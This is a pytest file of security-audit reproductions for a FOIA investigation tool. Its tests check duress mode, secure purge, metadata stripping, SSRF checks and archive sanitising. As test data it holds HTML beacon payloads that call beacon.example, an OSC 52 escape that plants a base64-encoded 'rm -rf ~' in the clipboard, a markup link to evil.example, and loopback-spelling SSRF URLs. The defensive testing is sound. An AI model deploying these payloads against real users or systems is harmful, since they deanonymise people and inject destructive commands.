"""Reproductions from the adversarial security audit (November 2026).

Each test demonstrates a place where the code breaks a promise made in
CLAUDE.md or docs/THREAT_MODEL.md, docs/TAILS.md, docs/USB.md, docs/AIRGAP.md.
They are marked ``xfail(strict=True)``: they fail today because the bug is
real, and they will report XPASS (a failure under strict mode) once the bug is
fixed, so whoever fixes it removes the marker and keeps the test.

The audit report carries the exploit scenario and a suggested fix for each id.
"""

from __future__ import annotations

import asyncio
import contextlib
import re
import socket
import stat
import threading
import zipfile
from pathlib import Path

import pytest
from typer.testing import CliRunner

from openfoia.db import has_sqlcipher

REPO = Path(__file__).resolve().parent.parent
runner = CliRunner()

needs_sqlcipher = pytest.mark.skipif(not has_sqlcipher(), reason="no SQLCipher driver installed")


def audit(finding_id: str):
    return pytest.mark.xfail(strict=True, reason=f"audit: {finding_id}")


@pytest.fixture
def data_dir(tmp_path, monkeypatch):
    d = tmp_path / "data"
    monkeypatch.setenv("OPENFOIA_DATA_DIR", str(d))
    monkeypatch.delenv("OPENFOIA_DB_PASSWORD", raising=False)
    return d


# ---------------------------------------------------------------------------
# A1 (critical): duress mode accepts a plaintext real database
# ---------------------------------------------------------------------------


@needs_sqlcipher
@audit("A1 duress mode leaves the real profile in plaintext")
def test_a1_duress_without_real_password_keeps_real_profile_encrypted(data_dir):
    """`init --duress-password X` (no --password/--encrypt) reports success.

    The real investigation ends up in profile_0.db as a PLAINTEXT SQLite file
    next to an encrypted decoy: the "opaque" slot names now point straight at
    the readable, real data.
    """
    from openfoia.cli import app

    result = runner.invoke(app, ["init", "--duress-password", "innocent-decoy"])

    real = data_dir / "profile_0.db"
    refused = result.exit_code != 0
    plaintext = real.exists() and real.read_bytes()[:16] == b"SQLite format 3\x00"
    assert refused or not plaintext, "duress mode configured with a plaintext real database"


# ---------------------------------------------------------------------------
# A2 (high): one unwritable file aborts `purge --secure`
# ---------------------------------------------------------------------------


@audit("A2 secure purge aborts on the first file it cannot overwrite")
def test_a2_secure_purge_survives_an_unwritable_file(tmp_path, monkeypatch):
    """`docs ingest` copies with shutil.copy2, so a read-only original (from a
    CD, a read-only share, or `chmod 444`) yields a read-only stored copy.
    For a non-root user `open(path, "r+b")` on it raises PermissionError, and
    secure_delete_dir lets the exception escape, leaving every file it had not
    reached yet. Root ignores mode bits, so the non-root check is simulated.
    """
    from openfoia import security
    from openfoia.pipeline.ingest import DocumentIngester

    original = tmp_path / "leak.txt"
    original.write_text("source memo")
    original.chmod(0o444)

    data = tmp_path / "data"
    result = asyncio.run(DocumentIngester(data / "docs").ingest_file(original))
    stored = Path(result.file_path)
    assert stat.S_IMODE(stored.stat().st_mode) == 0o444  # the trigger, as shipped

    (data / "aa_config.json").write_text('{"email": {"smtp_password": "hunter2"}}')
    (data / "zz_notes.txt").write_text("names of sources")

    real_open = open

    def non_root_open(path, mode="r", *args, **kwargs):
        writing = "+" in mode or "w" in mode
        if writing and Path(path).exists() and not Path(path).stat().st_mode & 0o200:
            raise PermissionError(13, "Permission denied", str(path))
        return real_open(path, mode, *args, **kwargs)

    monkeypatch.setattr(security, "open", non_root_open, raising=False)

    with contextlib.suppress(PermissionError):
        security.secure_delete_dir(data)
    left = sorted(p.name for p in data.rglob("*") if p.is_file())
    assert left == [], f"secure purge left plaintext behind: {left}"


# ---------------------------------------------------------------------------
# A3 (high): archived web pages still phone home when reopened
# ---------------------------------------------------------------------------

BEACON_PAYLOADS = {
    "svg_slash_onload": "<svg/onload=\"fetch('https://beacon.example/svg')\"></svg>",
    "meta_refresh": '<meta http-equiv="refresh" content="0;url=https://beacon.example/r">',
    "css_import": "<style>@import 'https://beacon.example/i.css';</style>",
    "script_close_with_space": "<script>fetch('https://beacon.example/s')</script >",
    "svg_image": '<svg><image href="https://beacon.example/i.png" /></svg>',
    "input_image": '<input type="image" src="https://beacon.example/in.png">',
    "body_background": '<body background="https://beacon.example/bg.png"></body>',
}


@audit("A3 _sanitize_for_archive lets remote loads and script through")
@pytest.mark.parametrize("name", sorted(BEACON_PAYLOADS))
def test_a3_archived_page_is_inert(name):
    """web.py promises "An archived page must be inert". Each payload below was
    confirmed in Chromium to issue a request to beacon.example when the
    sanitized archive is opened from disk: from the real IP, even when the page
    was originally fetched over Tor.
    """
    from openfoia.pipeline.web import _sanitize_for_archive

    clean = _sanitize_for_archive("<p>report</p>" + BEACON_PAYLOADS[name])
    assert "beacon.example" not in clean, clean


# ---------------------------------------------------------------------------
# A4 (high): metadata reported clean while identifying fields remain
# ---------------------------------------------------------------------------


def _verdict(path: Path):
    from openfoia.pipeline.metadata import describe, strip_metadata

    return describe(strip_metadata(path))


@audit("A4 PDF custom /Info keys survive and the copy is reported clean")
def test_a4_pdf_custom_info_keys_are_not_reported_clean(tmp_path):
    from pypdf import PdfReader, PdfWriter

    w = PdfWriter()
    w.add_blank_page(200, 200)
    w.add_metadata({"/Company": "Ministry of Interior Leak Unit"})
    p = tmp_path / "custom.pdf"
    with open(p, "wb") as f:
        w.write(f)

    clean, _note = _verdict(p)
    remaining = dict(PdfReader(str(p)).metadata or {})
    assert not (clean and "/Company" in remaining), remaining


@audit("A4 PDF annotation author (/T) survives and the copy is reported clean")
def test_a4_pdf_annotation_author_is_not_reported_clean(tmp_path):
    from pypdf import PdfWriter
    from pypdf.generic import (
        ArrayObject,
        DictionaryObject,
        FloatObject,
        NameObject,
        TextStringObject,
    )

    w = PdfWriter()
    w.add_blank_page(200, 200)
    annot = DictionaryObject(
        {
            NameObject("/Type"): NameObject("/Annot"),
            NameObject("/Subtype"): NameObject("/Text"),
            NameObject("/Rect"): ArrayObject([FloatObject(v) for v in (10, 10, 30, 30)]),
            NameObject("/T"): TextStringObject("Jane Source"),
            NameObject("/Contents"): TextStringObject("reviewed"),
        }
    )
    w.add_annotation(page_number=0, annotation=annot)
    p = tmp_path / "annot.pdf"
    with open(p, "wb") as f:
        w.write(f)

    clean, _note = _verdict(p)
    assert not (clean and b"Jane Source" in p.read_bytes())


@audit("A4 DOCX tracked-change author survives and the copy is reported clean")
def test_a4_docx_tracked_change_author_is_not_reported_clean(tmp_path):
    from docx import Document

    p = tmp_path / "memo.docx"
    doc = Document()
    doc.add_paragraph("memo body")
    doc.core_properties.author = "Jane Source"
    doc.save(p)
    with zipfile.ZipFile(p) as z:
        members = {n: z.read(n) for n in z.namelist()}
    ins = (
        '<w:p><w:ins w:id="1" w:author="Jane Source" w:date="2026-01-01T00:00:00Z">'
        "<w:r><w:t>inserted</w:t></w:r></w:ins></w:p>"
    )
    members["word/document.xml"] = (
        members["word/document.xml"].decode().replace("<w:sectPr", ins + "<w:sectPr", 1).encode()
    )
    with zipfile.ZipFile(p, "w", zipfile.ZIP_DEFLATED) as z:
        for n, b in members.items():
            z.writestr(n, b)

    clean, _note = _verdict(p)
    with zipfile.ZipFile(p) as z:
        still_there = any(b"Jane Source" in z.read(n) for n in z.namelist())
    assert not (clean and still_there)


# ---------------------------------------------------------------------------
# A5 (high): the setup guides put both passphrases on the command line
# ---------------------------------------------------------------------------


@audit("A5 docs tell users to type --password/--duress-password values")
def test_a5_docs_do_not_put_passphrases_in_argv():
    """The CLI itself warns that --password lands in shell history and the
    process list; TAILS.md, USB.md, AIRGAP.md and THREAT_MODEL.md still tell
    users to run `openfoia init --password REAL --duress-password DECOY`, which
    writes both secrets, side by side, into ~/.bash_history.
    """
    offenders = []
    pattern = re.compile(r"openfoia init\b.*--(?:duress-)?password[ =]\S")
    for doc in [*sorted((REPO / "docs").glob("*.md")), REPO / "README.md"]:
        for n, line in enumerate(doc.read_text(encoding="utf-8").splitlines(), 1):
            if pattern.search(line):
                offenders.append(f"{doc.name}:{n}: {line.strip()}")
    assert offenders == [], "\n".join(offenders)


# ---------------------------------------------------------------------------
# A6 (medium): the decoy profile is distinguishable from the real one
# ---------------------------------------------------------------------------


@needs_sqlcipher
@audit("A6 decoy profile has a different file mode than the real one")
def test_a6_profile_files_have_identical_modes(data_dir):
    from openfoia.cli import app

    result = runner.invoke(
        app, ["init", "--password", "real-passphrase", "--duress-password", "decoy-passphrase"]
    )
    assert result.exit_code == 0, result.output
    modes = {p.name: oct(stat.S_IMODE(p.stat().st_mode)) for p in data_dir.glob("profile_*.db")}
    assert len(set(modes.values())) == 1, modes


@needs_sqlcipher
@audit("A6 decoy profile has a different schema than any real database")
def test_a6_decoy_schema_matches_a_real_database(data_dir):
    from openfoia.cli import app
    from openfoia.db import get_sqlcipher_driver, sqlcipher_key_pragma

    result = runner.invoke(
        app, ["init", "--password", "real-passphrase", "--duress-password", "decoy-passphrase"]
    )
    assert result.exit_code == 0, result.output

    def tables(path, pw):
        conn = get_sqlcipher_driver().connect(str(path))
        conn.execute(sqlcipher_key_pragma(pw))
        conn.execute("PRAGMA cipher_compatibility = 4")
        names = {r[0] for r in conn.execute("SELECT name FROM sqlite_master WHERE type='table'")}
        conn.close()
        return names

    real = tables(data_dir / "profile_0.db", "real-passphrase")
    decoy = tables(data_dir / "profile_1.db", "decoy-passphrase")
    assert real == decoy, f"only in real: {sorted(real - decoy)}"


# ---------------------------------------------------------------------------
# A7 (medium): portable mode still creates ~/.openfoia on the host
# ---------------------------------------------------------------------------


def test_a7_portable_mode_writes_nothing_to_host_home(tmp_path, monkeypatch):
    home = tmp_path / "host-home"
    home.mkdir()
    usb = tmp_path / "usb"
    usb.mkdir()
    (usb / ".openfoia-portable").touch()
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.delenv("OPENFOIA_DATA_DIR", raising=False)
    monkeypatch.chdir(usb)

    from openfoia.config import load_config

    load_config()
    assert (usb / "openfoia-data").is_dir()
    assert not (home / ".openfoia").exists(), "portable mode left ~/.openfoia on the host"


# ---------------------------------------------------------------------------
# A8 (medium): terminal escape and Rich markup injection from API data
# ---------------------------------------------------------------------------


@audit("A8 API-supplied names reach the terminal with escape sequences intact")
def test_a8_records_output_strips_terminal_escapes(capsys):
    from openfoia import cli
    from openfoia.records.base import RecordEntity, SearchResult

    # OSC 52 writes the clipboard; OSC 0 retitles the window. Rich strips BEL
    # but not ESC, so the ST-terminated forms pass straight through.
    name = "Acme \x1b]52;c;cm0gLXJmIH4K\x1b\\ \x1b]0;t\x1b\\ Corp"
    result = SearchResult(
        source="opencorporates",
        query="acme",
        total_results=1,
        entities=[RecordEntity(entity_type="ORGANIZATION", name=name, source="opencorporates")],
    )
    cli._print_search_result(result, "opencorporates", "acme", 5, False, False, None)
    assert "\x1b" not in capsys.readouterr().out


@audit("A8 API-supplied names are parsed as Rich markup")
def test_a8_records_output_does_not_render_markup(capsys):
    from openfoia import cli
    from openfoia.records.base import RecordEntity, SearchResult

    name = "[link=https://evil.example/x]Verify[/link]"
    result = SearchResult(
        source="opencorporates",
        query="acme",
        total_results=1,
        entities=[RecordEntity(entity_type="ORGANIZATION", name=name, source="opencorporates")],
    )
    cli._print_search_result(result, "opencorporates", "acme", 5, False, False, None)
    out = capsys.readouterr().out
    assert "[link=" in out.replace("\n", "").replace("│", "").replace(" ", "")


# ---------------------------------------------------------------------------
# A9 (medium): document text sent to a remote LLM with no warning
# ---------------------------------------------------------------------------


@audit("A9 a remote Ollama base_url is used without any warning")
def test_a9_remote_ollama_is_warned_about(data_dir, monkeypatch, capsys):
    from openfoia.pipeline import extract

    monkeypatch.setattr(extract, "_llm_available", lambda *a: True)
    ex = extract.EntityExtractor(provider="ollama", base_url="http://gpu-box.example.net:11434")
    assert ex._resolve_backend() == "llm"
    assert "WARNING" in capsys.readouterr().err


@audit("A9 'localhost' anywhere in base_url is treated as local")
def test_a9_lookalike_host_is_not_called_local(data_dir, monkeypatch, capsys):
    from openfoia.pipeline import extract

    monkeypatch.setattr(extract, "_llm_available", lambda *a: True)
    ex = extract.EntityExtractor(
        provider="openai", api_key="k", base_url="https://localhost.attacker.example/v1"
    )
    ex._resolve_backend()
    err = capsys.readouterr().err
    assert "Using local AI provider" not in err and "WARNING" in err, err


# ---------------------------------------------------------------------------
# A10 (medium): web UI token in the browser's argv
# ---------------------------------------------------------------------------


def test_a10_token_not_in_browser_argv(monkeypatch):
    """Any local account can read /proc/<pid>/cmdline, take the token and read
    the whole investigation through 127.0.0.1, which bypasses the 0700 data
    directory that db._ensure_private_dir exists to enforce.
    """
    from openfoia import browser

    seen = []
    monkeypatch.setattr(browser.subprocess, "Popen", lambda args, **kw: seen.append(args))
    b = browser.Browser(browser.BrowserType.CHROMIUM, "Chromium", "/usr/bin/chromium")
    browser._launch_linux("http://127.0.0.1:8765/?token=SESSION-SECRET", b, True, False)
    assert seen and not any("SESSION-SECRET" in a for a in seen[0]), seen


# ---------------------------------------------------------------------------
# A11 (medium): tiny image -> gigabytes of RAM during metadata stripping
# ---------------------------------------------------------------------------


@audit("A11 image stripping materializes every pixel as a Python tuple")
def test_a11_image_strip_memory_is_bounded(tmp_path):
    """A 198 KiB 8000x8000 PNG (below Pillow's bomb threshold) drove a 5.4 GiB
    peak RSS in the audit. Here: Python-level allocations for a 1000x1000 RGB
    image must stay within a few copies of the raw 3 MB pixel buffer.
    """
    import tracemalloc

    from PIL import Image

    from openfoia.pipeline.metadata import strip_metadata

    side = 1000
    p = tmp_path / "flat.png"
    Image.new("RGB", (side, side), (255, 255, 255)).save(p)
    tracemalloc.start()
    try:
        strip_metadata(p)
        _, peak = tracemalloc.get_traced_memory()
    finally:
        tracemalloc.stop()
    assert peak < 4 * side * side * 3, f"peak Python allocation {peak / 1e6:.0f} MB"


# ---------------------------------------------------------------------------
# A12 (medium): SEC EDGAR requests carry a User-Agent unique to OpenFOIA
# ---------------------------------------------------------------------------


def test_a12_sec_user_agent_is_not_tool_unique(monkeypatch):
    import httpx

    from openfoia import net
    from openfoia.records import base
    from openfoia.records.sec_edgar import SECEdgarAdapter

    seen = []

    def handler(request):
        seen.append(request.headers["User-Agent"])
        return httpx.Response(200, json={"hits": {"hits": [], "total": {"value": 0}}})

    real = base.egress_client
    monkeypatch.setattr(
        base,
        "egress_client",
        lambda *a, **kw: real(*a, transport=httpx.MockTransport(handler), **kw),
    )
    monkeypatch.delenv("OPENFOIA_SEC_USER_AGENT", raising=False)
    asyncio.run(SECEdgarAdapter().search("Acme Corp"))
    assert seen and all(ua == net.DEFAULT_USER_AGENT for ua in seen), seen


# ---------------------------------------------------------------------------
# A13 (low): validate_download_url bypasses (SSRF to loopback/internal)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "https://2130706433/",  # decimal 127.0.0.1; glibc resolves it
        "https://127.1/",
        "https://0x7f000001/",
        "https://localhost./",
        "https://100.64.0.1/",  # carrier-grade NAT, not global
    ],
)
def test_a13_download_url_rejects_internal_spellings(url):
    from openfoia.records.base import validate_download_url

    with pytest.raises(ValueError):
        validate_download_url(url)


# ---------------------------------------------------------------------------
# A14 (low): SMTP EHLO announces the machine's hostname
# ---------------------------------------------------------------------------


@pytest.mark.allow_network  # loopback only: a fake SMTP server in this process
@audit("A14 SMTP EHLO sends the local hostname (often the owner's name)")
def test_a14_smtp_ehlo_does_not_leak_hostname(monkeypatch):
    from openfoia.gateways.base import DeliveryPayload
    from openfoia.gateways.email import EmailGateway

    monkeypatch.setattr(socket, "getfqdn", lambda *a: "janes-macbook-pro.local")
    srv = socket.socket()
    srv.bind(("127.0.0.1", 0))
    srv.listen(1)
    port = srv.getsockname()[1]
    seen = []

    def serve():
        conn, _ = srv.accept()
        conn.sendall(b"220 fake ESMTP\r\n")
        seen.append(conn.recv(1024))
        conn.sendall(b"250 fake\r\n")  # no STARTTLS offered: the client gives up
        conn.close()

    t = threading.Thread(target=serve, daemon=True)
    t.start()
    gw = EmailGateway(smtp_host="127.0.0.1", smtp_port=port, smtp_user="u", smtp_password="p")
    payload = DeliveryPayload("FOIA", "foia@agency.example", "subj", "body")
    asyncio.run(gw.send(payload))
    t.join(5)
    srv.close()
    assert seen and b"janes-macbook-pro" not in seen[0], seen


# ---------------------------------------------------------------------------
# A15 (low): shell-history scrub misses common places the commands land
# ---------------------------------------------------------------------------


@audit("A15 purge --secure leaves fish history and the USB.md run.sh helper lines")
def test_a15_history_scrub_covers_fish_and_run_sh(tmp_path, monkeypatch):
    from openfoia.security import clear_shell_history

    monkeypatch.setenv("HOME", str(tmp_path))
    (tmp_path / ".bash_history").write_text(
        "ls\n./run.sh request new --agency FBI --subject 'Minister X bribes'\n"
    )
    fish = tmp_path / ".local" / "share" / "fish"
    fish.mkdir(parents=True)
    (fish / "fish_history").write_text("- cmd: openfoia request new --subject Minister X\n")

    clear_shell_history()
    assert "Minister X" not in (tmp_path / ".bash_history").read_text()
    assert "Minister X" not in (fish / "fish_history").read_text()


# ---------------------------------------------------------------------------
# A16 (low): `browse --tor` can never work (fails closed)
# ---------------------------------------------------------------------------


def test_a16_tor_browse_proxy_scheme_is_supported_by_chromium():
    """Verified against Playwright's Chromium: socks5h:// gives
    net::ERR_NO_SUPPORTED_PROXIES; socks5:// reaches the SOCKS server. Chromium
    resolves hostnames through a socks5:// proxy already.
    """
    from openfoia.tor_browse import _tor_proxy_server

    assert _tor_proxy_server("127.0.0.1", 9050).split("://")[0] in ("socks5", "socks4")


# ---------------------------------------------------------------------------
# A17 (low): release job runs unpinned third-party code with a write token
# ---------------------------------------------------------------------------


def test_a17_release_workflow_pins_actions_and_drops_credentials():
    import yaml

    wf = yaml.safe_load((REPO / ".github" / "workflows" / "release.yml").read_text())
    steps = wf["jobs"]["publish"]["steps"]
    problems = []
    for step in steps:
        uses = step.get("uses")
        if not uses:
            continue
        if not re.search(r"@[0-9a-f]{40}$", uses):
            problems.append(f"not SHA-pinned: {uses}")
        if uses.startswith("actions/checkout") and (step.get("with") or {}).get(
            "persist-credentials", True
        ):
            problems.append("checkout persists the contents:write token into .git/config")
    assert problems == [], problems


# ---------------------------------------------------------------------------
# A18 (medium): purge leaves default exports that embed document text
# ---------------------------------------------------------------------------


@audit("A18 `analyze graph` writes graph.json to the cwd; purge never removes it")
def test_a18_purge_removes_default_graph_export(data_dir, tmp_path, monkeypatch):
    from uuid import uuid4

    from openfoia.cli import app
    from openfoia.db import get_session, init_db
    from openfoia.models import (
        Agency,
        DeliveryMethod,
        Document,
        DocumentType,
        Entity,
        EntityType,
        Request,
        User,
    )

    work = tmp_path / "work"
    work.mkdir()
    monkeypatch.chdir(work)
    init_db()
    with get_session() as s:
        u = User(id=str(uuid4()), email="a@b.c", name="L")
        s.add(u)
        s.flush()
        r = Request(
            id=str(uuid4()),
            request_number="R-1",
            requester_id=u.id,
            agency_id=s.query(Agency).first().id,
            subject="s",
            body="",
            delivery_method=DeliveryMethod.EMAIL,
        )
        s.add(r)
        s.flush()
        d = Document(
            id=str(uuid4()),
            request_id=r.id,
            doc_type=DocumentType.FULL_RESPONSE,
            filename="memo.txt",
            file_path="",
            file_size=0,
            mime_type="text/plain",
            extracted_text="Confidential source Jane Doe met the minister.",
        )
        s.add(d)
        s.flush()
        s.add(
            Entity(
                id=str(uuid4()),
                document_id=d.id,
                entity_type=EntityType.PERSON,
                raw_text="Jane Doe",
                normalized_text="jane doe",
                context="source Jane Doe",
            )
        )

    assert runner.invoke(app, ["analyze", "graph", "--all"]).exit_code == 0
    assert runner.invoke(app, ["purge", "--yes"]).exit_code == 0
    survivors = [p.name for p in work.iterdir() if "Jane Doe" in p.read_text(errors="replace")]
    assert survivors == [], f"plaintext export survived purge: {survivors}"
